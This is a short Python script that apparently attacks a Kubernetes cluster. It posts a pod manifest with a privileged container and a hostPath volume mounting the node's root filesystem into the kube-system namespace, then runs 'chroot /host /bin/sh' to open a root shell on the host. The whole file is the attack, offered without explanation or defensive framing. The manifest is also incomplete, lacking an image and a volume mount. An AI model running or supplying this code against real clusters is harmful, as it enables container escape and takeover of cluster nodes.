import requests
import subprocess

manifest = {
    "metadata": {"namespace": "kube-system"},
    "spec": {"containers": [{"securityContext": {"privileged": True}}],
             "volumes": [{"hostPath": {"path": "/"}}]},
}
requests.post("https://cluster.invalid/api/v1/namespaces/kube-system/pods", json=manifest)
subprocess.run("chroot /host /bin/sh", shell=True, check=True)
